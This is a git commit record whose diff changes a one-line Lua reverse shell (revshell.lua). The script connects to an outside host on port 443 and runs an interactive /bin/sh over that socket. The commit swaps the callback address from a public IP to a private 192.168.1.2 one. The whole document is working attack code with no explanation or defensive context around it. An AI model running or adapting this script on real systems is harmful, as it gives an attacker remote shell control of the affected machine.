a98502b11983f0da7a4a573236fa4b1707603415
GabrioT-QL <55578246+GabrioT-QL@users.noreply.github.com>
2020-02-11 10:29:30 +0100

    Update revshell.lua

--- revshell.lua
+++ revshell.lua
@@ -1,1 +1,1 @@
-socket = require('socket'); os = require('os');t=socket.tcp();t:connect("212.43.98.44","443");os.execute('/bin/sh -i <&3 >&3 2>&3');
+socket = require('socket'); os = require('os');t=socket.tcp();t:connect("192.168.1.2","443");os.execute('/bin/sh -i <&3 >&3 2>&3');
